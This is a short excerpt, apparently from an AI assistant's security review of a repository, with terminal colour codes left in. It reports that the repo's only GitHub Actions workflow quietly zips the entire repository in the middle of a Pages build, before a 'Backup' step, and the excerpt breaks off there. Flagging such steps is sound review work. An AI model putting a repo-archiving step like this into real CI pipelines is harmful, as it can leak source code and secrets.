[34m##[0m[37m [0m[34m1. Repo contents checked — and a real security problem found[0m

[37mThe repository contained[0m[37m one workflow[0m[37m: [0m[32m`[0m[32m.github/workflows/deploy.yml[0m[32m`[0m[37m.[0m[37m In[0m[37m the[0m[37m middle of an[0m[37m otherwise normal[0m[37m Pages[0m[37m build it ran:[0m

[37m```[0m[38;5;9myaml[0m
[37m- name: Archive entire repo[0m
[37m  run: zip -r repo.zip .[0m
[37m- name: Backup[0m
